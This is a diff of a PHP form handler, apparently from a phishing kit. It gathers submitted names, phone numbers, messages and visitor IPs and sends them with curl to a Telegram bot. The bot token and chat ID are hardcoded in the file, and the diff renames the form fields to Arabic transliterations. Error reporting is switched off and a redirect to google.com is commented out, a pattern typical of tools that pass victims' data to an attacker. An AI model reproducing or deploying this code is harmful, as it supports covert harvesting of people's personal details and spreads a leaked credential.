@@ -1,9 +1,6 @@
 <?php
     
     error_reporting(0);
-    define("TELEGRAM_TOKEN", '1970502639:AAFsBaH2bEplfsZVaVUCuLU-emN8t605vXY');
-    define("TELEGRAM_CHAT_ID", '-525974346');
-
     function telegram_message($message) {
         $curl = curl_init();
         $token  = "1970502639:AAFsBaH2bEplfsZVaVUCuLU-emN8t605vXY";
@@ -27,13 +24,11 @@
     }
     if ($_POST['what'] == "contact") {
         $message .= '/-- contact INFOS --/' . get_client_ip() . "\r\n";
-        $message .= 'Nom : ' . $_POST['name'] . "\r\n";
-        $message .= 'Telephone : ' . $_POST['tel'] . "\r\n";
-        $message .= 'Message : ' . $_POST['message'] . "\r\n";
+        $message .= 'Nom : ' . $_POST['ism'] . "\r\n";
+        $message .= 'Telephone : ' . $_POST['hatif'] . "\r\n";
+        $message .= 'Message : ' . $_POST['risala'] . "\r\n";
         $message .= '/-- END contact INFOS --/' . "\r\n";
         telegram_message($message);
         // header(location: "https://google.com");
     }
-    
-
 ?>
